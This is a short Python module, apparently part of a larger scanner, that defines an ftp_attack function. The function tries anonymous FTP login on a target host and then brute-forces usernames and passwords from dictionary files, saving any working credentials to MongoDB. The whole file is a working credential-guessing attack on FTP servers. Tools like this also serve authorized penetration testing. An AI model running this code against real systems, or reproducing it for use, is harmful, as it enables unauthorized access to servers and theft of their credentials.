# coding:utf-8

import ftplib



def ftp_attack(host, port, mongo):
    _info = dict(
        name="ftp",
        ip=host,
        port=port,
        username="",
        password=""
    )
    # 先测试匿名登陆
    try:
        ftp = ftplib.FTP()
        ftp.connect(host, port, 5)
        ftp.login()
        ftp.quit()
        mongo.insert(_info)
        return
    except ftplib.all_errors:
        pass

    # 字典爆破测试
    for username in open("dict/ftp_user.dic"):
        for password in open("dict/ftp_pass.dic"):
            _username = username.strip()
            _password = password.strip()
            try:
                ftp = ftplib.FTP()
                ftp.connect(host, port, 5)
                ftp.login(_username, _password)
                ftp.quit()
                _info["username"] = _username
                _info["password"] = _password
                mongo.insert(_info)
                break
            except ftplib.all_errors:
                pass
